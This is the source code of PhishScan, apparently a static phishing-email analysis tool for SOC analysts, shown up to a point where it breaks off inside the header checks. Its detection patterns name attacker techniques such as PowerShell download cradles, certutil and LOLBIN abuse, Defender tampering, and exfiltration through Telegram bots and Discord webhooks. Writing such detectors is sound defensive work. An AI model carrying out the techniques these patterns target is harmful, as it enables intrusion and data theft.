#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhishScan - Phishing e-mail analysis toolkit for SOC analysts / DFIR
=====================================================================
Static, SAFE analysis of .eml files. It NEVER visits URLs or executes attachments.

What it does (all in one run):
  Phase 1  Header analysis   : From/Reply-To/Return-Path, display-name spoof, Received chain,
                               origin IP, HELO/rDNS mismatch, time anomalies, mailer, spam headers
  Phase 2  Authentication    : SPF / DKIM / DMARC / ARC / CompAuth parsing + alignment
                               (--online: live SPF/DMARC DNS, domain age via RDAP/whois)
  Phase 3  Body analysis     : social-engineering keywords, BEC/extortion/callback, hidden text,
                               forms, link-text mismatch, tracking pixels, QR codes, fake reply chain
  Phase 4  URL analysis      : defang, unwrap SafeLinks/Proofpoint, lookalike/typosquat/punycode,
                               shorteners, abused platforms, open redirects, brand abuse
  Phase 5  Attachments       : true file type, double extension, macros, OOXML template injection,
                               PDF JS/Launch/URI, HTML smuggling, SVG scripts, LNK/ISO/ZIP content,
                               PE info, base64/PowerShell decoding, suspicious commands
  Phase 6  Threat intel      : (--online) VirusTotal + AbuseIPDB (API keys via env or flags)
  Phase 7  Scoring + verdict, MITRE ATT&CK mapping, IOC list (defanged), hunting queries (KQL),
           containment checklist, full report (Markdown / HTML / JSON / IOC CSV)

Usage:
  python3 phishscan.py suspicious.eml
  python3 phishscan.py suspicious.eml --out case001 --analyst "Your Name" --clicked --creds
  python3 phishscan.py suspicious.eml --online            (needs VT_API_KEY / ABUSEIPDB_API_KEY env)
  python3 phishscan.py --make-sample sample.eml           (creates a test phishing mail)

Requires: Python 3.8+ (standard library only).
Optional: oletools (macro parsing), pyzbar+Pillow or opencv-python (QR decoding),
          dnspython (DNS), dkimpy (DKIM verify), 7z/p7zip (ISO/RAR/7z listing).
"""
from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import html as htmllib
import io
import ipaddress
import json
import math
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
import zlib
from collections import Counter
from datetime import datetime, timezone
from email import message_from_bytes
from email.header import decode_header, make_header
from email.utils import getaddresses, parseaddr, parsedate_to_datetime
from html.parser import HTMLParser

VERSION = "1.0.0"

# ----------------------------------------------------------------------------
# KNOWLEDGE BASE
# ----------------------------------------------------------------------------
MULTI_TLD = {
    "co.uk", "org.uk", "ac.uk", "gov.uk", "com.au", "net.au", "org.au", "co.nz", "co.jp", "co.in",
    "com.br", "com.mx", "com.ar", "com.tr", "com.cn", "com.hk", "com.sg", "com.my", "co.za",
    "com.ng", "com.eg", "com.sa", "co.il", "com.pk", "com.dz", "co.kr", "com.ua", "com.pl",
    # hosting platforms where the tenant label is the "real" identity
    "pages.dev", "web.app", "firebaseapp.com", "github.io", "netlify.app", "vercel.app",
    "herokuapp.com", "workers.dev", "blogspot.com", "wixsite.com", "weebly.com", "glitch.me",
    "notion.site", "r2.dev", "azurewebsites.net", "cloudfront.net", "appspot.com", "repl.co",
    "000webhostapp.com", "webflow.io", "framer.app", "surge.sh", "ngrok.io", "ngrok-free.app",
}

SUSPICIOUS_TLDS = {
    "top", "xyz", "click", "zip", "mov", "work", "support", "link", "icu", "cyou", "cfd", "sbs",
    "rest", "buzz", "monster", "gq", "tk", "ml", "ga", "cf", "country", "kim", "loan", "men",
    "review", "stream", "download", "bid", "win", "vip", "quest", "lol", "bar", "ru", "su",
}

SHORTENERS = {
    "bit.ly", "tinyurl.com", "t.co", "goo.gl", "ow.ly", "is.gd", "buff.ly", "rebrand.ly", "cutt.ly",
    "shorturl.at", "tiny.cc", "rb.gy", "t.ly", "lnkd.in", "s.id", "bl.ink", "v.gd", "qrco.de",
    "adf.ly", "shorte.st", "clck.ru", "urlz.fr", "soo.gd", "tr.ee", "x.co", "mcaf.ee",
}

ABUSED_PLATFORMS = (
    "sharepoint.com", "onedrive.live.com", "1drv.ms", "docs.google.com", "drive.google.com",
    "forms.gle", "sites.google.com", "storage.googleapis.com", "dropbox.com", "canva.com",
    "notion.site", "pages.dev", "workers.dev", "r2.dev", "web.app", "firebaseapp.com", "github.io",
    "netlify.app", "vercel.app", "herokuapp.com", "weebly.com", "wixsite.com", "blogspot.com",
    "glitch.me", "typeform.com", "s3.amazonaws.com", "cloudfront.net", "ipfs.io", "azurewebsites.net",
    "web.core.windows.net", "blob.core.windows.net", "mailchi.mp", "sendgrid.net", "surveymonkey.com",
    "weebly.com", "godaddysites.com", "square.site", "carrd.co", "webflow.io", "framer.app",
    "jotform.com", "docsend.com", "box.com", "wetransfer.com", "we.tl", "mediafire.com",
)

FREEMAIL = {
    "gmail.com", "googlemail.com", "yahoo.com", "yahoo.fr", "ymail.com", "hotmail.com", "hotmail.fr",
    "outlook.com", "live.com", "msn.com", "aol.com", "proton.me", "protonmail.com", "gmx.com",
    "gmx.net", "mail.com", "icloud.com", "yandex.com", "yandex.ru", "zoho.com", "tutanota.com",
    "mail.ru", "qq.com", "163.com", "inbox.com", "rocketmail.com",
}

BRANDS = {
    "Microsoft": (["microsoft", "office365", "office-365", "o365", "outlook", "onedrive", "sharepoint",
                   "msoffice", "microsoft365"],
                  ["microsoft.com", "microsoftonline.com", "office.com", "office365.com", "live.com",
                   "outlook.com", "sharepoint.com", "onedrive.com", "msn.com", "microsoft365.com",
                   "windows.net", "azure.com", "windows.com", "skype.com", "bing.com", "1drv.ms",
                   "microsoftonline-p.com", "office.net", "msftauth.net", "msauth.net"]),
    "Google": (["google", "gmail", "gdrive"],
               ["google.com", "gmail.com", "googleapis.com", "gstatic.com", "googleusercontent.com",
                "goo.gl", "youtube.com", "googlemail.com", "withgoogle.com", "google.dz"]),
    "PayPal": (["paypal"], ["paypal.com", "paypal.me", "paypalobjects.com"]),
    "Apple": (["apple", "icloud", "itunes"], ["apple.com", "icloud.com", "itunes.com", "me.com"]),
    "Amazon": (["amazon", "amzn"], ["amazon.com", "amazonaws.com", "amazon.co.uk", "amazon.de",
                                    "amazon.fr", "amzn.com", "amzn.to", "amazon.in", "amazon.ca"]),
    "DocuSign": (["docusign"], ["docusign.com", "docusign.net"]),
    "DHL": (["dhl"], ["dhl.com", "dhl.de", "dhl.fr"]),
    "FedEx": (["fedex"], ["fedex.com"]),
    "Netflix": (["netflix"], ["netflix.com"]),
    "Meta": (["facebook", "instagram", "whatsapp"], ["facebook.com", "fb.com", "instagram.com",
                                                      "whatsapp.com", "meta.com", "facebookmail.com"]),
    "LinkedIn": (["linkedin"], ["linkedin.com", "lnkd.in"]),
    "Dropbox": (["dropbox"], ["dropbox.com", "dropboxusercontent.com", "dropboxmail.com"]),
    "Adobe": (["adobe"], ["adobe.com", "adobesign.com", "acrobat.com", "adobe.io"]),
    "Okta": (["okta"], ["okta.com", "oktapreview.com"]),
    "Zoom": (["zoom"], ["zoom.us", "zoom.com"]),
    "Banks": (["wellsfargo", "bankofamerica", "citibank", "hsbc", "barclays"],
              ["wellsfargo.com", "bankofamerica.com", "citi.com", "citibank.com", "hsbc.com",
               "barclays.com", "barclays.co.uk"]),
    "Crypto": (["binance", "coinbase", "metamask", "blockchain", "ledger"],
               ["binance.com", "coinbase.com", "metamask.io", "blockchain.com", "ledger.com"]),
}

URGENCY = ["urgent", "urgently", "immediately", "within 24 hours", "within 48 hours", "expires", "expire",
           "expiring", "final notice", "last warning", "act now", "suspended", "suspend", "deactivated",
           "will be closed", "terminated", "unusual activity", "unauthorized", "security alert",
           "action required", "failure to", "penalty", "overdue", "verify your", "confirm your",
           "limited access", "restricted", "asap", "time sensitive", "immediate action", "reminder",
           "last chance", "locked", "blocked", "disabled"]
CREDENTIAL = ["password", "passcode", "login", "log in", "sign in", "signin", "credentials",
              "verify your account", "account verification", "mfa", "2fa", "authenticator", "one-time",
              "otp", "security code", "reset your", "mailbox full", "storage full", "quota", "re-validate",
              "revalidate", "keep my password"]
FINANCIAL = ["wire transfer", "invoice", "payment", "bank details", "bank account", "iban", "swift",
             "routing number", "gift card", "itunes card", "bitcoin", "crypto", "wallet", "remittance",
             "purchase order", "change of bank", "direct deposit", "payroll", "w-2", "tax refund", "refund",
             "outstanding balance", "new bank", "updated banking"]
SECRECY = ["confidential", "keep this between us", "do not share", "don't tell", "discreet",
           "private matter", "are you available", "at your desk", "quick task", "need a favor",
           "need a favour", "urgent task", "don't call", "do not call", "only email", "cannot talk",
           "in a meeting", "can't talk"]
EXTORTION = ["i hacked", "hacked your", "webcam", "your device was infected", "bitcoin address",
             "ransom", "your password is", "recorded you", "adult website", "pay within", "i have access"]
AUTHORITY = ["ceo", "cfo", "director", "human resources", "hr department", "it support", "helpdesk",
             "help desk", "administrator", "security team", "legal department", "payroll", "accounts",
             "support team", "admin", "service desk", "it department", "compliance"]
CALLBACK = ["call us", "call now", "contact us at", "call our", "customer service", "billing department",
            "toll free", "helpline", "support number", "if you did not authorize", "charged", "subscription",
            "renewal", "auto-renew", "dispute"]
GENERIC_GREETING = re.compile(r"\bdear\s+(customer|user|member|client|account\s*holder|sir|madam|sir/madam|"
                              r"valued\s+\w+|email\s+user|webmail\s+user|colleague|employee)\b", re.I)

DANGEROUS_EXT = {
    "exe": 5, "scr": 5, "com": 5, "pif": 5, "bat": 5, "cmd": 5, "vbs": 5, "vbe": 5, "js": 5, "jse": 5,
    "wsf": 5, "wsh": 5, "hta": 5, "lnk": 5, "jar": 5, "msi": 5, "msp": 5, "ps1": 5, "psm1": 5, "reg": 5,
    "dll": 5, "cpl": 5, "xll": 5, "wll": 5, "scf": 5, "url": 5, "library-ms": 5, "search-ms": 5,
    "application": 5, "appx": 4, "msix": 4, "chm": 5, "gadget": 5, "inf": 4, "apk": 4, "dmg": 3,
    "iso": 3, "img": 3, "vhd": 3, "vhdx": 3, "one": 4, "onepkg": 4,
    "docm": 3, "xlsm": 3, "pptm": 3, "dotm": 3, "xltm": 3, "xlam": 3, "ppam": 3, "xlsb": 2,
    "html": 2, "htm": 2, "shtml": 2, "xhtml": 2, "svg": 2, "mht": 2, "mhtml": 2,
    "zip": 1, "rar": 1, "7z": 1, "gz": 1, "cab": 1, "arj": 1, "ace": 1, "tar": 1, "z": 1, "bz2": 1,
}
DOC_EXT = {"pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "jpg", "jpeg", "png", "gif", "txt", "rtf", "csv"}
EXEC_EXT = {"exe", "scr", "com", "pif", "bat", "cmd", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta",
            "lnk", "jar", "msi", "ps1", "dll", "cpl"}

NOISE_DOMAINS = (
    "schemas.microsoft.com", "schemas.openxmlformats.org", "www.w3.org", "purl.org", "ns.adobe.com",
    "www.openoffice.org", "schemas.xmlsoap.org", "openxmlformats.org", "xmlns.com", "www.microsoft.com",
    "crl.microsoft.com", "ocsp.", "crl.", "go.microsoft.com", "www.verisign.com", "ocsp.digicert.com",
    "www.digicert.com", "ns.useplus.org", "iptc.org", "purl.oclc.org", "docs.oasis-open.org", "w3.org",
)

SUSP_PATTERNS = [
    (r"powershell(?:\.exe)?\s+[^\n\r]{0,120}?-(?:e|en|enc|enco|encodedcommand)\b", "PowerShell encoded command", 5, "T1059.001"),
    (r"powershell(?:\.exe)?[^\n\r]{0,80}?-(?:w|window\w*)\s+hidden", "PowerShell hidden window", 3, "T1059.001"),
    (r"\b(?:Invoke-Expression|IEX)\b", "Invoke-Expression (IEX)", 3, "T1059.001"),
    (r"DownloadString|DownloadFile|Net\.WebClient|Invoke-WebRequest|Start-BitsTransfer|Invoke-RestMethod", "Download cradle", 4, "T1105"),
    (r"FromBase64String", "Base64 decode in script", 2, "T1140"),
    (r"\bcmd(?:\.exe)?\s+/c\b", "cmd.exe /c", 3, "T1059.003"),
    (r"\bmshta(?:\.exe)?\b", "mshta (LOLBIN)", 4, "T1218.005"),
    (r"\brundll32(?:\.exe)?\b", "rundll32 (LOLBIN)", 3, "T1218.011"),
    (r"\bregsvr32(?:\.exe)?\b", "regsvr32 (LOLBIN)", 4, "T1218.010"),
    (r"\bcertutil(?:\.exe)?\b[^\n\r]{0,80}-(?:urlcache|decode)", "certutil download/decode", 4, "T1105"),
    (r"\bbitsadmin\b", "bitsadmin", 3, "T1197"),
    (r"\b(?:wscript|cscript)(?:\.exe)?\b", "wscript/cscript", 3, "T1059.005"),
    (r"WScript\.Shell|Scripting\.FileSystemObject|ADODB\.Stream|MSXML2\.(?:Server)?XMLHTTP|Shell\.Application", "Windows scripting object", 4, "T1059.005"),
    (r"\bAuto_?Open\b|Document_Open|Workbook_Open|\bAutoExec\b|Document_Close", "Macro auto-execution", 3, "T1059.005"),
    (r"schtasks(?:\.exe)?\s+/create", "Scheduled task creation", 3, "T1053.005"),
    (r"\bwmic\b[^\n\r]{0,60}process\s+call\s+create", "WMIC process create", 4, "T1047"),
    (r"(?:Add|Set)-MpPreference|DisableRealtimeMonitoring", "Defender tampering", 4, "T1562.001"),
    (r"CurrentVersion\\Run", "Run-key persistence", 3, "T1547.001"),
    (r"\b(?:curl|wget)(?:\.exe)?\s+[^\n\r]{0,60}https?://", "curl/wget download", 2, "T1105"),
    (r"VirtualAlloc|WriteProcessMemory|CreateRemoteThread|NtUnmapViewOfSection", "Process-injection API", 3, "T1055"),
]
SUSP_RE = [(re.compile(p, re.I), d, pts, t) for p, d, pts, t in SUSP_PATTERNS]

HTML_PATTERNS = [
    (r"\batob\s*\(", "base64 decode (atob)", 1, ""),
    (r"\beval\s*\(", "eval()", 2, "T1027"),
    (r"\bunescape\s*\(|decodeURIComponent\s*\(\s*escape", "unescape()", 1, "T1027"),
    (r"String\.fromCharCode", "String.fromCharCode", 1, "T1027"),
    (r"document\.write\s*\(", "document.write", 1, ""),
    (r"new\s+Blob\s*\(", "Blob construction", 2, "T1027.006"),
    (r"createObjectURL|msSaveOrOpenBlob|msSaveBlob", "Blob download trigger", 2, "T1027.006"),
    (r"api\.telegram\.org/bot", "Telegram bot exfiltration endpoint", 5, "T1567"),
    (r"discord(?:app)?\.com/api/webhooks", "Discord webhook exfiltration", 5, "T1567"),
    (r"formsubmit\.co|formspree\.io|emailjs|web3forms|script\.google\.com/macros", "Form-to-email / exfil service", 4, "T1567"),
    (r"type\s*=\s*[\"']?password", "Password input field", 3, "T1056.003"),
    (r"<form[^>]+action\s*=\s*[\"']?https?://", "Form posts to external URL", 3, "T1056.003"),
    (r"location\.(?:href|replace|assign)\s*=|window\.location", "JavaScript redirect", 1, ""),
    (r"ipapi\.co|ipinfo\.io|ip-api\.com|api\.ipify\.org|geolocation-db\.com|ifconfig\.me", "Victim IP/geo lookup (kit fingerprinting)", 2, ""),
    (r"turnstile|hcaptcha|recaptcha|cf-challenge", "CAPTCHA / Turnstile gate (bot evasion)", 1, ""),
    (r"oncontextmenu|keyCode\s*={2,3}\s*123|devtools|debugger\s*;", "Anti-analysis (blocks DevTools/right-click)", 2, ""),
    (r"<iframe", "iframe present", 1, ""),
]
HTML_RE = [(re.compile(p, re.I), d, pts, t) for p, d, pts, t in HTML_PATTERNS]

MITRE = {
    "T1566": "Phishing", "T1566.001": "Phishing: Spearphishing Attachment",
    "T1566.002": "Phishing: Spearphishing Link", "T1598.003": "Phishing for Information: Spearphishing Link",
    "T1204.001": "User Execution: Malicious Link", "T1204.002": "User Execution: Malicious File",
    "T1036": "Masquerading", "T1036.007": "Masquerading: Double File Extension",
    "T1027": "Obfuscated Files or Information", "T1027.006": "HTML Smuggling",
    "T1059.001": "Command and Scripting: PowerShell", "T1059.003": "Command and Scripting: Windows Command Shell",
    "T1059.005": "Command and Scripting: Visual Basic", "T1059.007": "Command and Scripting: JavaScript",
    "T1553.005": "Subvert Trust Controls: Mark-of-the-Web Bypass", "T1221": "Template Injection",
    "T1656": "Impersonation", "T1583.001": "Acquire Infrastructure: Domains", "T1539": "Steal Web Session Cookie",
    "T1078": "Valid Accounts", "T1056.003": "Input Capture: Web Portal Capture", "T1140": "Deobfuscate/Decode Files",
    "T1218.005": "System Binary Proxy Execution: Mshta", "T1218.010": "System Binary Proxy Execution: Regsvr32",
    "T1218.011": "System Binary Proxy Execution: Rundll32", "T1105": "Ingress Tool Transfer",
    "T1567": "Exfiltration Over Web Service", "T1197": "BITS Jobs", "T1053.005": "Scheduled Task",
    "T1047": "Windows Management Instrumentation", "T1562.001": "Impair Defenses: Disable/Modify Tools",
    "T1547.001": "Registry Run Keys / Startup Folder", "T1055": "Process Injection",
    "T1204": "User Execution", "T1534": "Internal Spearphishing", "T1114": "Email Collection",
}

URL_RE = re.compile(r"""(?i)\b(?:https?|ftp)://[^\s<>"'\\^`{|}]+""")
WWW_RE = re.compile(r"""(?i)(?<![/@\w.])www\.[a-z0-9.-]+\.[a-z]{2,}(?:/[^\s<>"'\\^`{|}]*)?""")
EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
IPV4_RE = re.compile(r"(?<![\d.])((?:\d{1,3}\.){3}\d{1,3})(?![\d.])")
ZERO_WIDTH_RE = re.compile("[\u200b-\u200f\u2060\u2061\u2062\u2063\u2064\ufeff\u00ad]")
BTC_RE = re.compile(r"\b(?:bc1[a-z0-9]{25,60}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b")
PHONE_RE = re.compile(r"(?<![\d])(?:\+?\d{1,3}[\s.\-]?)?(?:\(\d{3}\)|\d{3})[\s.\-]?\d{3}[\s.\-]?\d{4}(?![\d])")

SEV_ORDER = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
CAT_CAPS = {"Header": 10, "Authentication": 12, "Body": 12, "URL": 15, "Attachment": 22, "Intel": 25}

TEST_NETS = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]


# ----------------------------------------------------------------------------
# SMALL HELPERS
# ----------------------------------------------------------------------------
def dh(v) -> str:
    """Decode a (possibly RFC2047-encoded) header value to str."""
    if v is None:
        return ""
    try:
        return str(make_header(decode_header(str(v)))).strip()
    except Exception:
        return str(v).strip()


def defang(s: str) -> str:
    s = str(s)
    s = re.sub(r"^(?i:http)", lambda m: "hxxp" if m.group(0).islower() else "HXXP", s)
    s = re.sub(r"^(?i:ftp)", "fxp", s)
    return s.replace(".", "[.]")


def is_public_ip(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    if a.is_global:
        return True
    return any(a in n for n in TEST_NETS if a.version == n.version)  # TEST-NET treated public (for samples)


def entropy(b: bytes) -> float:
    if not b:
        return 0.0
    n = len(b)
    return -sum(v / n * math.log2(v / n) for v in Counter(b).values())


def registered_domain(host: str) -> str:
    host = (host or "").lower().strip(".")
    if not host or re.fullmatch(r"[\d.]+", host) or ":" in host:
        return host
    parts = host.split(".")
    if len(parts) <= 2:
        return host
    last2 = ".".join(parts[-2:])
    if last2 in MULTI_TLD:
        return ".".join(parts[-3:])
    return last2


def tld_of(host: str) -> str:
    return (host or "").rsplit(".", 1)[-1].lower()


def levenshtein(a: str, b: str) -> int:
    if a == b:
        return 0
    if not a or not b:
        return max(len(a), len(b))
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
    return prev[-1]


def leet(s: str) -> str:
    s = s.lower()
    for a, b in (("rn", "m"), ("vv", "w"), ("0", "o"), ("1", "l"), ("3", "e"), ("4", "a"), ("5", "s"),
                 ("7", "t"), ("8", "b"), ("$", "s"), ("!", "i"), ("|", "l")):
        s = s.replace(a, b)
    return s


def host_in(host: str, domains) -> bool:
    host = (host or "").lower()
    return any(host == d or host.endswith("." + d) for d in domains)


def brand_for_domain(host: str):
    for brand, (_tokens, legit) in BRANDS.items():
        if host_in(host, legit):
            return brand
    return None


def lookalike(reg: str):
    """Return description if registered domain imitates a known brand, else None."""
    if not reg or "." not in reg:
        return None
    label = reg.split(".")[0]
    # (1) legit already?
    for brand, (tokens, legit) in BRANDS.items():
        if host_in(reg, legit):
            return None
    norm = leet(label)
    norm_nohy = norm.replace("-", "")
    for brand, (tokens, legit) in BRANDS.items():
        for tok in tokens:
            if len(tok) < 5:
                continue
            if tok in norm_nohy and label != tok:
                kind = "homoglyph/leet" if norm != label.lower() else "brand-in-domain"
                return f"{kind}: '{reg}' imitates {brand} ('{tok}')"
        for d in legit:
            l2 = d.split(".")[0]
            if len(l2) >= 6 and l2 != norm_nohy and levenshtein(norm_nohy, l2) <= 2 and abs(len(norm_nohy) - len(l2)) <= 2:
                return f"typosquat: '{reg}' is {levenshtein(norm_nohy, l2)} edit(s) from '{d}' ({brand})"
    return None


def kw_hits(text: str, words) -> list:
    t = (text or "").lower()
    return sorted({w for w in words if re.search(r"(?<![a-z0-9])" + re.escape(w) + r"(?![a-z0-9])", t)})


def has_str(data: bytes, s: str) -> bool:
    return s.encode() in data or s.encode("utf-16-le") in data


def printable_ratio(s: str) -> float:
    if not s:
        return 0.0
    return sum(1 for c in s if c.isprintable() or c in "\r\n\t") / len(s)


def parse_dt(v):
    try:
        d = parsedate_to_datetime(v)
        if d.tzinfo is None:
            d = d.replace(tzinfo=timezone.utc)
        return d
    except Exception:
        return None


def fmt_dt(d) -> str:
    return d.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC") if d else "n/a"


def noise_url(u: str) -> bool:
    h = (urllib.parse.urlsplit(u).hostname or "") if u else ""
    return any(h == n.rstrip(".") or h.startswith(n) or h.endswith(n.lstrip(".")) for n in NOISE_DOMAINS)


def unwrap_url(url: str):
    """Decode security-gateway / redirect wrappers. Returns (inner_url, wrapper_name) or (None, None)."""
    try:
        u = urllib.parse.urlsplit(url)
    except ValueError:
        return None, None
    host = (u.hostname or "").lower()
    q = urllib.parse.parse_qs(u.query)
    if host.endswith("safelinks.protection.outlook.com") and q.get("url"):
        return q["url"][0], "Microsoft Defender Safe Links"
    if host in ("www.google.com", "google.com") and u.path == "/url":
        v = q.get("q") or q.get("url")
        if v:
            return v[0], "Google redirector"
    if "urldefense" in host:
        m = re.search(r"/v3/__(.+?)__;", url)
        if m:
            return m.group(1), "Proofpoint URL Defense v3"
        if q.get("u"):
            return urllib.parse.unquote(q["u"][0].replace("-", "%").replace("_", "/")), "Proofpoint URL Defense v2"
    if host.endswith("linkedin.com") and "redir" in u.path and q.get("url"):
        return q["url"][0], "LinkedIn redirector"
    if host in ("l.facebook.com", "lm.facebook.com") and q.get("u"):
        return q["u"][0], "Facebook redirector"
    if host.endswith("mimecast.com") and q.get("domain"):
        return None, None
    for k in ("url", "u", "redirect", "redirect_uri", "redirect_url", "next", "goto", "target", "dest",
              "destination", "continue", "returnurl", "return", "link", "r", "q"):
        v = q.get(k)
        if v and re.match(r"(?i)https?://", v[0]) and (urllib.parse.urlsplit(v[0]).hostname or "") != host:
            return v[0], f"open-redirect parameter '{k}'"
    return None, None


# ----------------------------------------------------------------------------
# HTML PARSER
# ----------------------------------------------------------------------------
class BodyParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links, self.forms, self.images, self.iframes, self.metas, self.inputs = [], [], [], [], [], []
        self.hidden = []
        self.scripts = 0
        self.base = None
        self.text = []
        self._a = None
        self._skip = 0

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        st = re.sub(r"\s+", "", a.get("style", "")).lower()
        if st and re.search(r"display:none|font-size:0|visibility:hidden|opacity:0(?:[;\"]|$)|max-height:0|line-height:0|width:0", st):
            self.hidden.append(tag)
        if tag in ("script", "style"):
            self._skip += 1
            if tag == "script":
                self.scripts += 1
        if tag == "a" and a.get("href"):
            self._a = {"href": a["href"].strip(), "text": ""}
        elif tag == "area" and a.get("href"):
            self.links.append({"href": a["href"].strip(), "text": ""})
        elif tag == "img":
            self.images.append({"src": a.get("src", ""), "w": a.get("width", ""), "h": a.get("height", ""),
                                "alt": a.get("alt", ""), "style": st})
            if self._a is not None:
                self._a["text"] += " [image] "
        elif tag == "form":
            self.forms.append({"action": a.get("action", ""), "method": a.get("method", "get")})
        elif tag == "input":
            self.inputs.append(a.get("type", "text").lower())
        elif tag == "iframe":
            self.iframes.append(a.get("src", ""))
        elif tag == "meta" and a.get("http-equiv", "").lower() == "refresh":
            self.metas.append(a.get("content", ""))
        elif tag == "base":
            self.base = a.get("href")

    def handle_endtag(self, tag):
        if tag in ("script", "style") and self._skip:
            self._skip -= 1
        if tag == "a" and self._a is not None:
            self._a["text"] = " ".join(self._a["text"].split())
            self.links.append(self._a)
            self._a = None

    def handle_data(self, data):
        if self._skip:
            return
        self.text.append(data)
        if self._a is not None:
            self._a["text"] += data


# ----------------------------------------------------------------------------
# ANALYSIS CORE
# ----------------------------------------------------------------------------
class Analysis:
    def __init__(self, path: str, raw: bytes, args):
        self.path, self.raw, self.args = path, raw, args
        self.msg = message_from_bytes(raw)
        self.sha256 = hashlib.sha256(raw).hexdigest()
        self.md5 = hashlib.md5(raw).hexdigest()
        self.findings, self.iocs, self.urls, self.attachments, self.hops = [], [], [], [], []
        self.tags, self.mitre, self.intel = set(), set(), {"vt": [], "abuseipdb": [], "notes": []}
        self.auth, self.authinfo, self.dns, self.domain_age = {}, {}, {}, {}
        self.html_features, self.body_info = {}, {}
        self.text_parts, self.html_parts, self.raw_atts, self.inline_imgs = [], [], [], []
        self.qr_results, self.qr_supported = [], None
        self.analysis_time = datetime.now(timezone.utc)
        self.scores, self.total, self.verdict, self.confidence, self.severity = {}, 0, "", "", ""
        self.from_addr = self.from_domain = self.from_name = ""
        self.subject = ""
        self.raw_headers = re.split(rb"\r?\n\r?\n", raw, maxsplit=1)[0].decode("utf-8", "replace")
        self._url_seen = {}

    # ---- findings / iocs ----------------------------------------------------
    def add(self, cat, sev, title, detail="", pts=0, mitre=(), tag=None):
        self.findings.append({"cat": cat, "sev": sev, "title": title, "detail": detail, "pts": pts})
        for m in mitre:
            if m:
                self.mitre.add(m)
        if tag:
            self.tags.add(tag)

    def ioc(self, typ, val, ctx=""):
        val = (val or "").strip()
        if not val:
            return
        if any(i["type"] == typ and i["value"] == val for i in self.iocs):
            return
        self.iocs.append({"type": typ, "value": val, "context": ctx})

    def h(self, name):
        return dh(self.msg.get(name))

    # ---- master -------------------------------------------------------------
    def run(self):
        self.collect_parts()
        self.analyze_headers()
        self.analyze_received()
        self.analyze_auth()
        self.analyze_body()
        self.analyze_urls()
        self.analyze_attachments()
        if self.args.online:
            self.online_checks()
        self.score()
        return self

    # ---- parts --------------------------------------------------------------
    def collect_parts(self):
        for part in self.msg.walk():
            ct = part.get_content_type()
            if ct == "message/rfc822":
                self.add("Attachment", "INFO", "Contains an attached/forwarded e-mail (message/rfc822)",
                         "Inner message parts are analysed as part of this mail.", 0)
            if part.is_multipart():
                continue
            disp = (part.get("Content-Disposition") or "").lower()
            fn = dh(part.get_filename()) if part.get_filename() else ""
            try:
                payload = part.get_payload(decode=True) or b""
            except Exception:
                payload = b""
            if ct in ("text/plain", "text/html") and not fn and "attachment" not in disp:
                cs = part.get_content_charset() or "utf-8"
                try:
                    txt = payload.decode(cs, "replace")
                except LookupError:
                    txt = payload.decode("utf-8", "replace")
                (self.html_parts if ct == "text/html" else self.text_parts).append(txt)
            elif ct.startswith("image/") and not fn:
                self.inline_imgs.append((part.get("Content-ID", ""), payload))
            elif fn or "attachment" in disp or ct.startswith(("application/", "audio/", "video/")):
                self.raw_atts.append((fn or "(unnamed)", ct, payload))
            elif ct.startswith("text/") and payload:
                self.text_parts.append(payload.decode("utf-8", "replace"))

    # ---- headers ------------------------------------------------------------
    def analyze_headers(self):
        m = self.msg
        self.subject = self.h("Subject")
        from_raw = self.h("From")
        self.from_name, self.from_addr = parseaddr(from_raw)
        self.from_addr = self.from_addr.lower()
        self.from_domain = self.from_addr.rsplit("@", 1)[-1] if "@" in self.from_addr else ""
        from_reg = registered_domain(self.from_domain)
        self.ioc("email", self.from_addr, "From (header)")
        if self.from_domain:
            self.ioc("domain", self.from_domain, "Sender domain")

        if len(m.get_all("From", [])) > 1:
            self.add("Header", "HIGH", "Multiple From headers", "Classic parser-confusion / spoofing trick.", 3, tag="spoof")
        if not self.from_addr or "@" not in self.from_addr:
            self.add("Header", "MEDIUM", "From address missing or malformed", from_raw, 2)

        # display-name tricks
        name_l = (self.from_name or "").lower()
        em = EMAIL_RE.search(self.from_name or "")
        if em and registered_domain(em.group(0).split("@")[1].lower()) != from_reg:
            self.add("Header", "HIGH", "Display name contains a different e-mail address",
                     f"Display name shows {em.group(0)} but real sender is {self.from_addr}", 3, ("T1656",), "spoof")
        compact = re.sub(r"[^a-z0-9]", "", name_l)
        for brand, (tokens, legit) in BRANDS.items():
            if any(t in compact for t in tokens if len(t) >= 4) and not host_in(self.from_domain, legit):
                self.add("Header", "HIGH", f"Display name impersonates {brand}",
                         f"Display name '{self.from_name}' but sender domain is {self.from_domain}", 3, ("T1656",), "brand")
                break
        la = lookalike(from_reg)
        if la:
            self.add("Header", "HIGH", "Sender domain is a lookalike of a known brand", la, 3, ("T1583.001", "T1656"), "brand")
        if self.from_domain in FREEMAIL and kw_hits(name_l, AUTHORITY):
            self.add("Header", "MEDIUM", "Authority-style display name on a free-mail account",
                     f"'{self.from_name}' <{self.from_addr}>", 2, ("T1656",), "bec")

        # reply-to / return-path
        rt_raw = self.h("Reply-To")
        if rt_raw:
            rn, ra = parseaddr(rt_raw)
            ra = ra.lower()
            self.ioc("email", ra, "Reply-To (header)")
            rd = ra.rsplit("@", 1)[-1]
            if rd and registered_domain(rd) != from_reg:
                pts = 2 + (1 if rd in FREEMAIL else 0)
                self.add("Header", "HIGH", "Reply-To differs from From",
